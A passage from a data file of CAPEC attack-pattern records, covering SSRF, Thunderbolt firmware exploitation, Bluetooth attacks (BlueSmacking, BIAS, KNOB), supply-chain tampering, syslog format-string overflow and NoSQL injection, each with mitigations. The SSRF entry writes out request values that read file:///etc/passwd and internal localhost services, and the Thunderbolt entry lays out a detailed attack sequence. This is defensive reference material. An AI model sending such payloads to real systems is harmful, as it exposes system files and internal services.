prevented.::\",\"::An e-commerce website allows a customer to filter results by specific categories. When the customer selects the category of choice, the web shop queries a back-end service to retrieve the requested products. The request may look something like: POST /product/category HTTP/1.0 Content-Type: application/x-www-form-urlencoded Content-Length: 200 vulnerableService=http://vulnerableshop.net:8080/product/category/check%3FcategoryName%3DsomeCategory A malicious user can modify the request URL to look like this instead: POST /product/category HTTP/1.0 Content-Type: application/x-www-form-urlencoded Content-Length: 200 vulnerableService=http://localhost/server-status or vulnerableService = file:///etc/passwd or vulnerableService=dict://localhost:12345/info If the exploit is successful, the server may return the data requested by the adversary root:!:0:0::/:/usr/bin/ksh daemon:!:1:1::/etc: bin:!:2:2::/bin: sys:!:3:3::/usr/sys: adm:!:4:4::/var/adm: uucp:!:5:5::/usr/lib/uucp: guest:!:100:100::/home/guest: nobody:!:4294967294:4294967294::/: lpd:!:9:4294967294::/: lp:*:11:11::/var/spool/lp:/bin/false invscout:*:200:1::/var/adm/invscout:/usr/bin/ksh nuucp:*:6:5:uucp login user:/var/spool/uucppublic:/usr/sbin/uucp/uucico paul:!:201:1::/home/paul:/usr/bin/ksh jdoe:*:202:1:My name:/home/myname:/usr/bin/ksh::The CallStranger attack is an observed example of SSRF. It specifically targets the UPnP (Universal Plug and Play) protocol used by various network devices and gaming consoles. To execute the attack, an adversary performs a scan of the LAN to discover UPnP enabled devices, and subsequently a list of UPnP services they use. Once the UPnP service endpoints are listed, a vulnerability in the UPnP protocol is used to send these endpoints as encrypted to a verification server via the UPnP Callback method. Because the encryption is done on the client side, the server returns an encrypted list of services which is decrypted on the client side. The adversary then has a list of services running the vulnerable UPnP protocol, which the adversary can leverage to make spoofed requests. [REF-646]::\",\"::918::20::\",\"\",\"\",\n665,\"Exploitation of Thunderbolt Protection Flaws\",Detailed,Stable,\"An adversary leverages a firmware weakness within the Thunderbolt protocol, on a computing device to manipulate Thunderbolt controller firmware in order to exploit vulnerabilities in the implementation of authorization and verification schemes within Thunderbolt protection mechanisms. Upon gaining physical access to a target device, the adversary conducts high-level firmware manipulation of the victim Thunderbolt controller SPI (Serial Peripheral Interface) flash, through the use of a SPI Programing device and an external Thunderbolt device, typically as the target device is booting up. If successful, this allows the adversary to modify memory, subvert authentication mechanisms, spoof identities and content, and extract data and memory from the target device. Currently 7 major vulnerabilities exist within Thunderbolt protocol with 9 attack vectors as noted in the Execution Flow.\",\"\",Low,Very High,\"::NATURE:ChildOf:CAPEC ID:276::NATURE:CanFollow:CAPEC ID:390::NATURE:PeerOf:CAPEC ID:458::NATURE:PeerOf:CAPEC ID:148::NATURE:PeerOf:CAPEC ID:151::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey physical victim environment and potential Thunderbolt system targets] The adversary monitors the target's physical environment to identify systems with Thunderbolt interfaces, identify potential weaknesses in physical security in addition to periods of nonattendance by the victim over their Thunderbolt interface equipped devices, and when the devices are in locked or sleep state.::STEP:2:PHASE:Explore:DESCRIPTION:[Evaluate the target system and its Thunderbolt interface] The adversary determines the device's operating system, Thunderbolt interface version, and any implemented Thunderbolt protections to plan the attack.::STEP:1:PHASE:Experiment:DESCRIPTION:[Obtain and/or clone firmware image] The adversary physically manipulates Thunderbolt enabled devices to acquire the firmware image from the target and/or adversary Thunderbolt host controller's SPI (Serial Peripheral Interface) flash.:TECHNIQUE:Disassemble victim and/or adversary device enclosure with basic tools to gain access to Thunderbolt controller SPI flash by connecting adversary SPI programmer.:TECHNIQUE:Adversary connects SPI programmer to adversary-controlled Thunderbolt enabled device to obtain/clone victim thunderbolt controller firmware image through tools/scripts.:TECHNIQUE:Clone firmware image with SPI programmer and tools/scripts on adversary-controlled device.::STEP:2:PHASE:Experiment:DESCRIPTION:[Parse and locate relevant firmware data structures and information based upon Thunderbolt controller model, firmware version, and other information] The acquired victim and/or adversary firmware image is parsed for specific data and other relevant identifiers required for exploitation, based upon the victim device information and firmware version.:TECHNIQUE:Utilize pre-crafted tools/scripts to parse and locate desired firmware data and modify it.:TECHNIQUE:Locate DROM (Device Read Only Memory) data structure section and calculate/determine appropriate offset to replicate victim device UUID.:TECHNIQUE:Locate ACL (Access Control List) data structure and calculate/determine appropriate offsets to identify victim device UUID.:TECHNIQUE:Locate data structure containing challenge-response key information between appropriate offsets.::STEP:3:PHASE:Experiment:DESCRIPTION:[Disable Thunderbolt security and prevent future Thunderbolt security modifications (if necessary)] The adversary overrides the target device's Thunderbolt Security Level to None (SL0) and/or enables block protections upon the SPI flash to prevent the ability for the victim to perform and/or recognize future Thunderbolt security modifications as well as update the Thunderbolt firmware.:TECHNIQUE:The adversary-controlled Thunderbolt device, connected to SPI programmer and victim device via Thunderbolt ports, is utilized to execute commands within tools/scripts to disable SPI flash protections, modify Thunderbolt Security Level, and enable malicious SPI flash protections.::STEP:4:PHASE:Experiment:DESCRIPTION:[Modify/replace victim Thunderbolt firmware image] The modified victim and/or adversary thunderbolt firmware image is written to attacker SPI flash.::STEP:1:PHASE:Exploit:DESCRIPTION:[Connect adversary-controlled thunderbolt enabled device to victim device and verify successful execution of malicious actions] The adversary needs to determine if their exploitation of selected vulnerabilities had the intended effects upon victim device.:TECHNIQUE:Observe victim device identify adversary device as the victim device and enables PCIe tunneling.:TECHNIQUE:Resume victim device from sleep, connect adversary-controlled device and observe security is disabled and Thunderbolt connectivity is restored with PCIe tunneling being enabled.:TECHNIQUE:Observe that in UEFI or Thunderbolt Management Tool/UI that the Security Level does not match adversary modified Security Level of None (SL0):TECHNIQUE:Observe after installation of Firmware update that within Thunderbolt Management UI the NVM version is unchanged/same prior to the prompt of successful Firmware update/installation.::STEP:2:PHASE:Exploit:DESCRIPTION:[Exfiltration of desired data from victim device to adversary device] Utilize PCIe tunneling to transfer desired data and information from victim device across Thunderbolt connection.::\",\"::The adversary needs at least a few minutes of physical access to a system with an open Thunderbolt port, version 3 or lower, and an external thunderbolt device controlled by the adversary with maliciously crafted software and firmware, via an SPI Programming device, to exploit weaknesses in security protections.::\",\"::SKILL:Detailed knowledge on various system motherboards, PCI Express Domain, SPI, and Thunderbolt Protocol in order to interface with internal system components via external devices.:LEVEL:High::SKILL:Detailed knowledge on OS/Kernel memory address space, Direct Memory Access (DMA) mapping, Input-Output Memory Management Units (IOMMUs), and vendor memory protections for data leakage.:LEVEL:High::SKILL:Detailed knowledge on scripting and SPI programming in order to configure and modify Thunderbolt controller firmware and software configurations.:LEVEL:High::\",\"::SPI Programming device capable of modifying/configuring or replacing the firmware of Thunderbolt device stored on SPI Flash of target Thunderbolt controller, as well as modification/spoofing of adversary-controlled Thunderbolt controller.::Precrafted scripts/tools capable of implementing the modification and replacement of Thunderbolt Firmware.::Thunderbolt-enabled computing device capable of interfacing with target Thunderbolt device and extracting/dumping data and memory contents of target device.::\",\"::Windows Event logs may document the access of Thunderbolt port as a USB 3.0 event as well as any malicious actions taken upon target device as file system and memory events.::\",\"::SCOPE:Access Control:TECHNICAL IMPACT:Bypass Protection Mechanism::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Authorization:TECHNICAL IMPACT:Execute Unauthorized Commands::\",\"::Implementation: Kernel Direct Memory Access Protection::Configuration: Enable UEFI option USB Passthrough mode - Thunderbolt 3 system port operates as USB 3.1 Type C interface::Configuration: Enable UEFI option DisplayPort mode - Thunderbolt 3 system port operates as video-only DP interface::Configuration: Enable UEFI option Mixed USB/DisplayPort mode - Thunderbolt 3 system port operates as USB 3.1 Type C interface with support for DP mode::Configuration: Set Security Level to SL3 for Thunderbolt 2 system port::Configuration: Disable PCIe tunneling to set Security Level to SL3::Configuration: Disable Boot Camp upon MacOS systems::\",\"::An adversary steals a password protected laptop that contains a Thunderbolt 3 enabled port, from a work environment. The adversary uses a screw driver to remove the back panel of the laptop and connects a SPI Programming device to the Thunderbolt Host Controller SPI Flash of the stolen victim device to interface with it on the adversary's own Thunderbolt enabled device via Thunderbolt cables. The SPI Programming device is utilized to execute scripts/tools from the adversary's own system to copy, parse, and modify the victim's Thunderbolt firmware stored on SPI Flash. The device UUID value is obtained, by computing the appropriate offset based upon Thunderbolt firmware version and the OS of victim device, from the DROM section of victim Thunderbolt host controller firmware image. The firmware image is written to adversary Thunderbolt host controller SPI flash to clone and spoof victim device identity. The adversary reboots the victim device, with the victim device identifying the Thunderbolt connection of the adversary's Thunderbolt device as itself and enables PCIe tunneling. The adversary finally transfers the hard drive and memory contents of victim device across Thunderbolt connection.::\",\"::345::353::288::1188::862::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1211:ENTRY NAME:Exploitation for Defensive Evasion::::TAXONOMY NAME:ATTACK:ENTRY ID:1542.002:ENTRY NAME:Pre-OS Boot: Component Firmware::::TAXONOMY NAME:ATTACK:ENTRY ID:1556:ENTRY NAME:Modify Authentication Process::\",\"\",\n666,\"BlueSmacking\",Standard,Draft,\"An adversary uses Bluetooth flooding to transfer large packets to Bluetooth enabled devices over the L2CAP protocol with the goal of creating a DoS. This attack must be carried out within close proximity to a Bluetooth enabled device.\",\"\",Medium,Medium,\"::NATURE:ChildOf:CAPEC ID:125::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Scan for Bluetooth Enabled Devices] Using BlueZ along with an antenna, an adversary searches for devices with Bluetooth on.:TECHNIQUE:Note the MAC address of the device you want to attack.::STEP:2:PHASE:Experiment:DESCRIPTION:[Change L2CAP Packet Length] The adversary must change the L2CAP packet length to create packets that will overwhelm a Bluetooth enabled device.:TECHNIQUE:An adversary downloads and installs BlueZ, the standard Bluetooth utility package for Linux.::STEP:3:PHASE:Exploit:DESCRIPTION:[Flood] An adversary sends the packets to the target device, and floods it until performance is degraded.::\",\"::The system/application has Bluetooth enabled.::\",\"::SKILL:An adversary only needs a Linux machine along with a Bluetooth adapter, which is extremely common.:LEVEL:Low::\",\"\",\"::Performance is degraded or halted by incoming L2CAP packets.::\",\"::SCOPE:Availability:TECHNICAL IMPACT:Unreliable Execution:TECHNICAL IMPACT:Resource Consumption::\",\"::Disable Bluetooth when not being used.::When using Bluetooth, set it to hidden or non-discoverable mode.::\",\"\",\"::404::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1498.001:ENTRY NAME:Network Denial of Service: Direct Network Flood::::TAXONOMY NAME:ATTACK:ENTRY ID:1499.001:ENTRY NAME:Endpoint Denial of Service: OS Exhaustion Flood::\",\"\",\n667,\"Bluetooth Impersonation AttackS (BIAS)\",Detailed,Draft,\"An adversary disguises the MAC address of their Bluetooth enabled device to one for which there exists an active and trusted connection and authenticates successfully. The adversary can then perform malicious actions on the target Bluetooth device depending on the target’s capabilities.\",\"\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:616::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Find disguise and target] The adversary starts the Bluetooth service on the attacking device and searches for nearby listening devices.:TECHNIQUE:Knowledge of a trusted MAC address.:TECHNIQUE:Scanning for devices other than the target that may be trusted.::STEP:2:PHASE:Experiment:DESCRIPTION:[Disguise] Using the MAC address of the device the adversary wants to impersonate, they may use a tool such as spooftooth or macchanger to spoof their Bluetooth address and attempt to authenticate with the target.::STEP:3:PHASE:Exploit:DESCRIPTION:[Use device capabilities to accomplish goal] Finally, if authenticated successfully the adversary can perform tasks/information gathering dependent on the target's capabilities and connections.::\",\"::Knowledge of a target device's list of trusted connections.::\",\"::SKILL:Adversaries must be capable of using command line Linux tools.:LEVEL:Low::SKILL:Adversaries must be in close proximity to Bluetooth devices.:LEVEL:Low::\",\"\",\"\",\"::SCOPE:Integrity:NOTE:An adversary will be impersonating another Bluetooth device, and may gain access to information pertaining to that user along with the ability to manipulate other information.::SCOPE:Confidentiality:NOTE:An adversary will have unauthorized access to information.::\",\"::Disable Bluetooth in public places.::Verify incoming Bluetooth connections; do not automatically trust.::Change default PIN passwords and always use one when connecting.::\",\"\",\"::290::\",\"\",\"\",\n668,\"Key Negotiation of Bluetooth Attack (KNOB)\",Standard,Draft,\"An adversary can exploit a flaw in Bluetooth key negotiation allowing them to decrypt information sent between two devices communicating via Bluetooth. The adversary uses an Adversary in the Middle setup to modify packets sent between the two devices during the authentication process, specifically the entropy bits. Knowledge of the number of entropy bits will allow the attacker to easily decrypt information passing over the line of communication.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:115::NATURE:CanPrecede:CAPEC ID:148::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Discovery] Using an established Person in the Middle setup, search for Bluetooth devices beginning the authentication process.:TECHNIQUE:Use packet capture tools.::STEP:2:PHASE:Experiment:DESCRIPTION:[Change the entropy bits] Upon recieving the initial key negotiation packet from the master, the adversary modifies the entropy bits requested to 1 to allow for easy decryption before it is forwarded.::STEP:3:PHASE:Exploit:DESCRIPTION:[Capture and decrypt data] Once the entropy of encryption is known, the adversary can capture data and then decrypt on their device.::\",\"::Person in the Middle network setup.::\",\"::SKILL:Ability to modify packets.:LEVEL:Medium::\",\"::Bluetooth adapter, packet capturing capabilities.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::\",\"::Newer Bluetooth firmwares ensure that the KNOB is not negotaited in plaintext. Update your device.::\",\"::Given users Alice, Bob and Charlie (Charlie being the attacker), Alice and Bob begin to agree on an encryption key when connecting. While Alice sends a message to Bob that an encryption key with 16 bytes of entropy should be used, Charlie changes this to 1 and forwards the request to Bob and continues forwarding these packets until authentication is successful.::\",\"::425::285::693::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1565.002:ENTRY NAME:Data Manipulation: Transmitted Data Manipulation::\",\"\",\n669,\"Alteration of a Software Update\",Standard,Draft,\"An adversary with access to an organization’s software update infrastructure inserts malware into the content of an outgoing update to fielded systems where a wide range of malicious effects are possible. With the same level of access, the adversary can alter a software update to perform specific malicious acts including granting the adversary control over the software’s normal functionality.\",\"\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:184::NATURE:CanPrecede:CAPEC ID:673::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify software with frequent updates] The adversary must first identify a target software that has updates at least with some frequency, enough that there is am update infrastructure.::STEP:2:PHASE:Experiment:DESCRIPTION:[Gain access to udpate infrastructure] The adversary must then gain access to the organization's software update infrastructure. This can either be done by gaining remote access from outside the organization, or by having a malicious actor inside the organization gain access. It is often easier if someone within the organization gains access.::STEP:3:PHASE:Exploit:DESCRIPTION:[Alter the software update] Through access to the software update infrastructure, an adversary will alter the software update by injecting malware into the content of an outgoing update.::\",\"::An adversary would need to have penetrated an organization’s software update infrastructure including gaining access to components supporting the configuration management of software versions and updates related to the software maintenance of customer systems.::\",\"::SKILL:Skills required include the ability to infiltrate the organization’s software update infrastructure either from the Internet or from within the organization, including subcontractors, and be able to change software being delivered to customer/user systems in an undetected manner.:LEVEL:High::\",\"\",\"\",\"::SCOPE:Access Control:TECHNICAL IMPACT:Gain Privileges::SCOPE:Authorization:TECHNICAL IMPACT:Execute Unauthorized Commands::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::\",\"::Have a Software Assurance Plan that includes maintaining strict configuration management control of source code, object code and software development, build and distribution tools; manual code reviews and static code analysis for developmental software; and tracking of all storage and movement of code.::Require elevated privileges for distribution of software and software updates.::\",\"::A subcontractor to a software developer injects maliciously altered software updates into an automated update process that distributes to government and commercial customers software containing a hidden backdoor.::\",\"\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1195.002:ENTRY NAME:Supply Chain Compromise: Compromise Software Supply Chain::\",\"\",\n67,\"String Format Overflow in syslog()\",Detailed,Draft,\"This attack targets applications and software that uses the syslog() function insecurely. If an application does not explicitely use a format string parameter in a call to syslog(), user input can be placed in the format string parameter leading to a format string injection attack. Adversaries can then inject malicious format string commands into the function call leading to a buffer overflow. There are many reported software vulnerabilities with the root cause being a misuse of the syslog() function.\",\"\",High,Very High,\"::NATURE:ChildOf:CAPEC ID:100::NATURE:ChildOf:CAPEC ID:135::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify target application] The adversary identifies a target application or program to perform the buffer overflow on. In this attack, adversaries look for applications that use syslog() incorrectly.::STEP:2:PHASE:Experiment:DESCRIPTION:[Find injection vector] The adversary identifies an injection vector to deliver the excessive content to the targeted application's buffer. For each user-controllable input that the adversary suspects is vulnerable to format string injection, attempt to inject formatting characters such as %n, %s, etc.. The goal is to manipulate the string creation using these formatting characters.:TECHNIQUE:Inject probe payload which contains formatting characters (%s, %d, %n, etc.) through input parameters.::STEP:3:PHASE:Experiment:DESCRIPTION:[Craft overflow content] The adversary crafts the content to be injected. If the intent is to simply cause the software to crash, the content need only consist of an excessive quantity of random data. If the intent is to leverage the overflow for execution of arbitrary code, the adversary will craft a set of content that not only overflows the targeted buffer but does so in such a way that the overwritten return address is replaced with one of the adversaries' choosing which points to code injected by the adversary.:TECHNIQUE:The formatting characters %s and %d are useful for observing memory and trying to print memory addresses. If an adversary has access to the log being written to they can observer this output and use it to help craft their attack.:TECHNIQUE:The formatting character %n is useful for adding extra data onto the buffer.::STEP:4:PHASE:Exploit:DESCRIPTION:[Overflow the buffer] Using the injection vector, the adversary supplies the program with the crafted format string injection, causing a buffer.::\",\"::The Syslog function is used without specifying a format string argument, allowing user input to be placed direct into the function call as a format string.::\",\"\",\"\",\"\",\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Availability:TECHNICAL IMPACT:Unreliable Execution::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::\",\"::The code should be reviewed for misuse of the Syslog function call. Manual or automated code review can be used. The reviewer needs to ensure that all format string functions are passed a static string which cannot be controlled by the user and that the proper number of arguments are always sent to that function as well. If at all possible, do not use the %n operator in format strings. The following code shows a correct usage of Syslog(): syslog(LOG_ERR, %s, cmdBuf); The following code shows a vulnerable usage of Syslog(): syslog(LOG_ERR, cmdBuf); // the buffer cmdBuff is taking user supplied data.::\",\"::Format string vulnerability in TraceEvent function for ntop before 2.1 allows remote adversaries to execute arbitrary code by causing format strings to be injected into calls to the syslog function, via (1) an HTTP GET request, (2) a user name in HTTP authentication, or (3) a password in HTTP authentication. See also: CVE-2002-0412::\",\"::120::134::74::20::680::697::\",\"TAXONOMY NAME:WASC:ENTRY ID:06:ENTRY NAME:Format String::\",\"\",\n670,\"Software Development Tools Maliciously Altered\",Detailed,Draft,\"An adversary with the ability to alter tools used in a development environment causes software to be developed with maliciously modified tools. Such tools include requirements management and database tools, software design tools, configuration management tools, compilers, system build tools, and software performance testing and load testing tools. The adversary then carries out malicious acts once the software is deployed including malware infection of other systems to support further compromises.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:444::NATURE:CanPrecede:CAPEC ID:669::\",\"\",\"::An adversary would need to have access to a targeted developer’s development environment and in particular to tools used to design, create, test and manage software, where the adversary could ensure malicious code is included in software packages built through alteration or substitution of tools in the environment used in the development of software.::\",\"::SKILL:Ability to leverage common delivery mechanisms (e.g., email attachments, removable media) to infiltrate a development environment to gain access to software development tools for the purpose of malware insertion into an existing tool or replacement of an existing tool with a maliciously altered copy.:LEVEL:High::\",\"\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Execute Unauthorized Commands::SCOPE:Access Control:TECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:TECHNICAL IMPACT:Modify Data:TECHNICAL IMPACT:Read Data::\",\"::Have a security concept of operations (CONOPS) for the development environment that includes: Maintaining strict security administration and configuration management of requirements management and database tools, software design tools, configuration management tools, compilers, system build tools, and software performance testing and load testing tools.::Avoid giving elevated privileges to developers.::\",\"::An adversary with access to software build tools inside an Integrated Development Environment IDE alters a script used for downloading dependencies from a dependent code repository where the script has been changed to include malicious code implanted in the repository by the adversary.::\",\"\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1127:ENTRY NAME:Trusted Developer Utilities Proxy Execution::::TAXONOMY NAME:ATTACK:ENTRY ID:1195.001:ENTRY NAME:Supply Chain Compromise: Compromise Software Dependencies and Development Tools::\",\"\","
  },
  "doc-21882cc2275ca2c3b7a7e49e1af21d04": {
    "content": "'ID,Name,Abstraction,Status,Description,Alternate Terms,Likelihood Of Attack,Typical Severity,Related Attack Patterns,Execution Flow,Prerequisites,Skills Required,Resources Required,Indicators,Consequences,Mitigations,Example Instances,Related Weaknesses,Taxonomy Mappings,Notes\n671,\"Requirements for ASIC Functionality Maliciously Altered\",Detailed,Draft,\"An adversary with access to functional requirements for an application specific integrated circuit (ASIC), a chip designed/customized for a singular particular use, maliciously alters requirements derived from originating capability needs. In the chip manufacturing process, requirements drive the chip design which, when the chip is fully manufactured, could result in an ASIC which may not meet the user’s needs, contain malicious functionality, or exhibit other anomalous behaviors thereby affecting the intended use of the ASIC.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:447::\",\"\",\"::An adversary would need to have access to a foundry’s or chip maker’s requirements management system that stores customer requirements for ASICs, requirements upon which the design of the ASIC is based.::\",\"::SKILL:An adversary would need experience in designing chips based on functional requirements in order to manipulate requirements in such a way that deviations would not be detected in subsequent stages of ASIC manufacture and where intended malicious functionality would be available to the adversary once integrated into a system and fielded.:LEVEL:High::\",\"\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Alter Execution Logic::\",\"::Utilize DMEA’s (Defense Microelectronics Activity) Trusted Foundry Program members for acquisition of microelectronic components.::Ensure that each supplier performing hardware development implements comprehensive, security-focused configuration management including for hardware requirements and design.::Require that provenance of COTS microelectronic components be known whenever procured.::Conduct detailed vendor assessment before acquiring COTS hardware.::\",\"::An adversary with access to ASIC functionality requirements for various customers, targets a particular customer’s ordered lot of ASICs by altering its functional requirements such that the ASIC design will result in a manufactured chip that does not meet the customer’s capability needs.::\",\"\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1195.003:ENTRY NAME:Supply Chain Compromise: Compromise Hardware Supply Chain::\",\"\",\n672,\"Malicious Code Implanted During Chip Programming\",Detailed,Draft,\"During the programming step of chip manufacture, an adversary with access and necessary technical skills maliciously alters a chip’s intended program logic to produce an effect intended by the adversary when the fully manufactured chip is deployed and in operational use. Intended effects can include the ability of the adversary to remotely control a host system to carry out malicious acts.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:444::\",\"\",\"::An adversary would need to have access to a foundry’s or chip maker’s development/production environment where programs for specific chips are developed, managed and uploaded into targeted chips prior to distribution or sale.::\",\"::SKILL:An adversary needs to be skilled in microprogramming, manipulation of configuration management systems, and in the operation of tools used for the uploading of programs into chips during manufacture. Uploading can be for individual chips or performed on a large scale basis.:LEVEL:Medium::\",\"\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Alter Execution Logic::\",\"::Utilize DMEA’s (Defense Microelectronics Activity) Trusted Foundry Program members for acquisition of microelectronic components.::Ensure that each supplier performing hardware development implements comprehensive, security-focused configuration management of microcode and microcode generating tools and software.::Require that provenance of COTS microelectronic components be known whenever procured.::Conduct detailed vendor assessment before acquiring COTS hardware.::\",\"::Following a chip’s production process steps of test and verification and validation of chip circuitry, an adversary involved in the generation of microcode defining the chip’s function(s) inserts a malicious instruction that will become part of the chip’s program. When integrated into a system, the chip will produce an effect intended by the adversary.::\",\"\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1195.003:ENTRY NAME:Supply Chain Compromise: Compromise Hardware Supply Chain::\",\"\",\n673,\"Developer Signing Maliciously Altered Software\",Detailed,Draft,\"Software produced by a reputable developer is clandestinely infected with malicious code and then digitally signed by the unsuspecting developer, where the software has been altered via a compromised software development or build process prior to being signed. The receiver or user of the software has no reason to believe that it is anything but legitimate and proceeds to deploy it to organizational systems. This attack differs from CAPEC-206, since the developer is inadvertently signing malicious code they believe to be legitimate and which they are unware of any malicious modifications.\",\"\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:444::\",\"\",\"::An adversary would need to have access to a targeted developer’s software development environment, including to their software build processes, where the adversary could ensure code maliciously tainted prior to a build process is included in software packages built.::\",\"::SKILL:The adversary must have the skills to infiltrate a developer’s software development/build environment and to implant malicious code in developmental software code, a build server, or a software repository containing dependency code, which would be referenced to be included during the software build process.:LEVEL:High::\",\"\",\"\",\"::SCOPE:Integrity:SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data:TECHNICAL IMPACT:Modify Data::SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges:TECHNICAL IMPACT:Execute Unauthorized Commands::\",\"::Have a security concept of operations (CONOPS) for the IDE that includes: Protecting the IDE via logical isolation using firewall and DMZ technologies/architectures; Maintaining strict security administration and configuration management of configuration management tools, developmental software and dependency code repositories, compilers, and system build tools.::Employ intrusion detection and malware detection capabilities on IDE systems where feasible.::\",\"::An adversary who has infiltrated an organization’s build environment maliciously alters code intended to be included in a product’s software build via software dependency inclusion, part of the software build process. When the software product has been built, the developer electronically signs the finished product using their signing key. The recipient of the software product, an end user/customer, believes the software to reflect the developer’s intent with respect to functionality unaware of the adversary’s malicious intent harbored within.::\",\"\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1195.002:ENTRY NAME:Supply Chain Compromise: Compromise Software Supply Chain::\",\"\",\n674,\"Design for FPGA Maliciously Altered\",Detailed,Stable,\"An adversary alters the functionality of a field-programmable gate array (FPGA) by causing an FPGA configuration memory chip reload in order to introduce a malicious function that could result in the FPGA performing or enabling malicious functions on a host system. Prior to the memory chip reload, the adversary alters the program for the FPGA by adding a function to impact system operation.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:447::\",\"\",\"::An adversary would need to have access to FPGA programming/configuration-related systems in a chip maker’s development environment where FPGAs can be initially configured prior to delivery to a customer or have access to such systems in a customer facility where end-user FPGA configuration/reconfiguration can be performed.::\",\"::SKILL:An adversary would need to be skilled in FPGA programming in order to create/manipulate configurations in such a way that when loaded into an FPGA, the end user would be able to observe through testing all user-defined required functions but would be unaware of any additional functions the adversary may have introduced.:LEVEL:High::\",\"\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Alter Execution Logic::\",\"::Utilize DMEA’s (Defense Microelectronics Activity) Trusted Foundry Program members for acquisition of microelectronic components.::Ensure that each supplier performing hardware development implements comprehensive, security-focused configuration management including for FPGA programming and program uploads to FPGA chips.::Require that provenance of COTS microelectronic components be known whenever procured.::Conduct detailed vendor assessment before acquiring COTS hardware.::\",\"::An adversary with access and the ability to alter the configuration/programming of FPGAs in organizational systems, introduces a trojan backdoor that can be used to alter the behavior of the original system resulting in, for example, compromise of confidentiality of data being processed.::\",\"\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1195.003:ENTRY NAME:Supply Chain Compromise: Compromise Hardware Supply Chain::\",\"\",\n675,\"Retrieve Data from Decommissioned Devices\",Standard,Stable,\"An adversary obtains decommissioned, recycled, or discarded systems and devices that can include an organization’s intellectual property, employee data, and other types of controlled information. Systems and devices that have reached the end of their lifecycles may be subject to recycle or disposal where they can be exposed to adversarial attempts to retrieve information from internal memory chips and storage devices that are part of the system.\",\"\",Medium,Medium,\"::NATURE:ChildOf:CAPEC ID:116::NATURE:CanPrecede:CAPEC ID:37::\",\"\",\"::An adversary needs to have access to electronic data processing equipment being recycled or disposed of (e.g., laptops, servers) at a collection location and the ability to take control of it for the purpose of exploiting its content.::\",\"::SKILL:An adversary may need the ability to mount printed circuit boards and target individual chips for exploitation.:LEVEL:High::SKILL:An adversary needs the technical skills required to extract solid state drives, hard disk drives, and other storage media to host on a compatible system or harness to gain access to digital content.:LEVEL:Medium::\",\"\",\"\",\"::SCOPE:Accountability:TECHNICAL IMPACT:Bypass Protection Mechanism::\",\"::Backup device data before erasure to retain intellectual property and inside knowledge.::Overwrite data on device rather than deleting. Deleted data can still be recovered, even if the device trash can is emptied. Rewriting data removes any trace of the old data. Performing multiple overwrites followed by a zeroing of the device (overwriting with all zeros) is good practice.::Use a secure erase software.::Physically destroy the device if it is not intended to be reused. Using a specialized service to disintegrate, burn, melt or pulverize the device can be effective, but if those services are inaccessible, drilling nails or holes, or smashing the device with a hammer can be effective. Do not burn, microwave, or pour acid on a hard drive.::Physically destroy memory and SIM cards for mobile devices not intended to be reused.::Ensure that the user account has been terminated or switched to a new device before destroying.::\",\"::A company is contracted by an organization to provide data destruction services for solid state and hard disk drives being discarded. Prior to destruction, an adversary within the contracted company copies data from select devices, violating the data confidentiality requirements of the submitting organization.::\",\"::1266::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1052:ENTRY NAME:Exfiltration Over Physical Medium::\",\"\",\n676,\"NoSQL Injection\",Standard,Stable,\"An adversary targets software that constructs NoSQL statements based on user input or with parameters vulnerable to operator replacement in order to achieve a variety of technical impacts such as escalating privileges, bypassing authentication, and/or executing code.\",\"\",High,High,\"::NATURE:ChildOf:CAPEC ID:248::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey target application] Due to the number of NoSQL databases available and the numerous language/API combinations of each, the adversary must first survey the target application to learn what technologies are being leveraged and how they interact with user-driven data.:TECHNIQUE:Determine the technology stack leveraged by the target application, such as the application server, drivers, frameworks, APIs, and databases being utilized.:TECHNIQUE:Identify areas of the application that interact with user input and may be involved with NoSQL queries.::STEP:2:PHASE:Experiment:DESCRIPTION:[Identify user-controllable input susceptible to injection] After identifying the technology stack being used and where user-driven input is leveraged, determine the user-controllable input susceptible to injection such as authentication or search forms. For each user-controllable input that the adversary suspects is vulnerable to NoSQL injection, attempt to 